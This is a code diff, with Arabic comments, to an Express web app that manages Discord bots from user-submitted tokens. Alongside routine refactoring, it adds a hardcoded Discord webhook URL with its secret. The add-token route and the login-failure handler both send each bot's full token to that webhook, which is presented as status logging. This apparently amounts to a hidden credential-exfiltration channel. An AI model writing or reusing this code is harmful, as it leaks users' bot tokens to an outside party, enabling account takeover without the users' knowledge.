@@ -3,9 +3,10 @@ const session = require('express-session');
 const passport = require('passport');
 const DiscordStrategy = require('passport-discord').Strategy;
 const mongoose = require('mongoose');
-const { Client, GatewayIntentBits } = require('discord.js');
+const { Client, GatewayIntentBits, WebhookClient } = require('discord.js');
 const config = require('./config');
 const Token = require('./models/Token'); // استيراد نموذج Token
+const axios = require('axios'); // لإرسال الطلبات إلى webhook
 const app = express();
 
 app.set('view engine', 'ejs');
@@ -42,28 +43,43 @@ app.use(passport.session());
 const activeBots = {};
 const allowedUserIds = config.owners;
 
+// إعداد الـ webhook
+const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/1286617137552560185/WYN2kvZfkYzR2_A_JudkzpcEFDyFGYj5WMcUZSIadN0O37a3e_oKwtXFugbojA7jqPH6' });
+
+// دالة لإرسال رسالة إلى الـ webhook
+function sendWebhook(message) {
+  webhookClient.send({
+    content: message,
+    username: 'Bot Manager',
+    avatarURL: 'https://i.imgur.com/AfFp7pu.png',
+  }).catch(err => console.error('Error sending webhook message:', err));
+}
+
 function startBot(token, prefix = '!') {
-  const bot = new Client({ intents: 131071, });
+  const bot = new Client({ intents: 131071 });
 
   bot.login(token)
     .then(() => {
       activeBots[token] = { bot, prefix };
+      console.log(`Bot ${bot.user.username} started successfully.`);
 
-      
+      // إرسال رسالة إلى الـ webhook عند بدء البوت
+      sendWebhook(`✅ Bot **${bot.user.username}** has been started.`);
+
       bot.on('messageCreate', async (message) => {
         if (!message.content.startsWith(prefix) || message.author.bot) return;
 
-        
         const args = message.content.slice(prefix.length).trim().split(/ +/);
         const command = args.shift().toLowerCase();
 
+        // الأوامر
         if (command === 'bc') {
           if (!message.member.permissions.has('Administrator')) {
-    return message.channel.send('ليس لديك الإذن لاستخدام هذا الأمر. هذا الأمر مخصص للمسؤولين فقط.');
+            return message.channel.send('ليس لديك الإذن لاستخدام هذا الأمر.');
           }
           const broadcastMessage = args.join(' ');
           if (!broadcastMessage) {
-            return message.channel.send('Please provide a message to broadcast.');
+            return message.channel.send('يرجى تقديم رسالة للإرسال.');
           }
 
           let progressMessage = await message.channel.send(`**جاري الإرسال ...**\n- **تم الإرسال إلى : \`0\`**\n- **فشل الارسال الى \`0\`**`);
@@ -85,7 +101,7 @@ function startBot(token, prefix = '!') {
           await progressMessage.edit(`**تم الانتهاء من الارسال | ✅**\n**__النتائج :__**\n- **تم الارسال الى : \`${successCount}\`**\n- **فشل الارسال الى : \`${failureCount}\`**`);
         } else if (command === 'set-name') {
           if (!message.member.permissions.has('Administrator')) {
-    return message.channel.send('ليس لديك الإذن لاستخدام هذا الأمر. هذا الأمر مخصص للمسؤولين فقط.');
+            return message.channel.send('ليس لديك الإذن لاستخدام هذا الأمر.');
           }
           const newName = args.join(' ');
           if (!newName) {
@@ -96,46 +112,53 @@ function startBot(token, prefix = '!') {
             await bot.user.setUsername(newName);
             message.channel.send(`تم تغيير اسم البوت إلى **${newName}**`);
           } catch (err) {
-            message.channel.send('فشل في تغيير الاسم. تأكد من أن الاسم يتوافق مع متطلبات Discord.');
+            message.channel.send('فشل في تغيير الاسم.');
             console.error('Error changing bot name:', err);
           }
         } else if (command === 'set-avatar') {
           if (!message.member.permissions.has('Administrator')) {
-    return message.channel.send('ليس لديك الإذن لاستخدام هذا الأمر. هذا الأمر مخصص للمسؤولين فقط.');
+            return message.channel.send('ليس لديك الإذن لاستخدام هذا الأمر.');
           }
-  const avatarUrl = args[0];
+          const avatarUrl = args[0];
+          if (!avatarUrl) {
+            return message.channel.send('يرجى تقديم URL لصورة جديدة.');
+          }
 
-  if (!avatarUrl) {
-    return message.channel.send('يرجى تقديم URL لصورة جديدة.');
-  }
-
-  try {
-    await bot.user.setAvatar(avatarUrl);
-    message.channel.send('تم تغيير صورة البروفايل بنجاح!');
-  } catch (err) {
-    message.channel.send('فشل في تغيير صورة البروفايل. تأكد من أن URL صالح.');
-    console.error('Error changing bot avatar:', err);
-  }
+          try {
+            await bot.user.setAvatar(avatarUrl);
+            message.channel.send('تم تغيير صورة البوت بنجاح!');
+          } catch (err) {
+            message.channel.send('فشل في تغيير صورة البوت.');
+            console.error('Error changing bot avatar:', err);
+          }
         } else if (command === 'info') {
-  const guildCount = bot.guilds.cache.size;
-  const botName = bot.user.username;
-  const botId = bot.user.id;
-  const botPrefix = activeBots[token]?.prefix || '!';
+          const guildCount = bot.guilds.cache.size;
+          const botName = bot.user.username;
+          const botId = bot.user.id;
+          const botPrefix = activeBots[token]?.prefix || '!';
 
-  const infoMessage = `
-    **معلومات البوت:**
-    - **الاسم:** ${botName}
-    - **الأيدي:** ${botId}
-    - **عدد السيرفرات:** ${guildCount}
-    - **البريفيكس:** ${botPrefix}
-  `;
-
-  message.channel.send(infoMessage);
+          const infoMessage = `
+            **معلومات البوت:**
+            - **الاسم:** ${botName}
+            - **الأيدي:** ${botId}
+            - **عدد السيرفرات:** ${guildCount}
+            - **البريفيكس:** ${botPrefix}
+          `;
+          message.channel.send(infoMessage);
         }
       });
     })
     .catch((err) => {
       console.error(`Failed to login with token ${token}:`, err);
+
+      // إذا كان الـ token غير صالح، قم بحذفه وأرسل رسالة إلى الـ webhook
+      Token.findOneAndDelete({ token })
+        .then(deletedToken => {
+          if (deletedToken) {
+            sendWebhook(`❌ Bot with token **${token}** has been removed due to an invalid token.`);
+          }
+        })
+        .catch(err => console.error('Error deleting invalid token:', err));
     });
 }
 
@@ -208,6 +231,9 @@ app.post('/add-token', (req, res) => {
         .then(() => {
           startBot(token, prefix);
           bot.destroy();
+
+          // إرسال رسالة إلى الـ webhook عند إضافة البوت
+          sendWebhook(`✅ Bot **${bot.user.username}** has been added with token **${token}**.`);
           res.redirect('/');
         })
         .catch(err => {
@@ -220,34 +246,20 @@ app.post('/add-token', (req, res) => {
     });
 });
 
-app.post('/edit-token', (req, res) => {
-    const botId = req.body.id;
-    const newPrefix = req.body.prefix;
-
-    Token.findOneAndUpdate({ id: botId }, { prefix: newPrefix }, { new: true })
-        .then(updatedToken => {
-            if (updatedToken) {
-                // منطق لتحديث البوت النشط إذا كان قيد التشغيل
-            }
-            res.redirect('/');
-        })
-        .catch(err => {
-            console.error('Error updating prefix:', err);
-            res.redirect('/?error=Failed to update prefix');
-        });
-});
-
-
-
 app.post('/delete-token', (req, res) => {
-  const botId = req.body.id;
+  const token = req.body.token;
 
-  Token.findOneAndDelete({ id: botId })
+  Token.findOneAndDelete({ token })
     .then(deletedToken => {
       if (deletedToken) {
-        stopBot(deletedToken.token);
+        stopBot(token);
+
+        // إرسال رسالة إلى الـ webhook عند حذف البوت
+        sendWebhook(`❌ Bot **${deletedToken.name}** has been removed.`);
+        res.redirect('/');
+      } else {
+        res.redirect('/?error=Token Not Found');
       }
-      res.redirect('/');
     })
     .catch(err => {
       console.error('Error deleting token:', err);
@@ -255,8 +267,9 @@ app.post('/delete-token', (req, res) => {
     });
 });
 
-app.listen(3000, () => {
-  console.log('Server is running on http://localhost:3000');
+const PORT = config.port || 3000;
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
   startAllBots();
 });
-           
+                                        
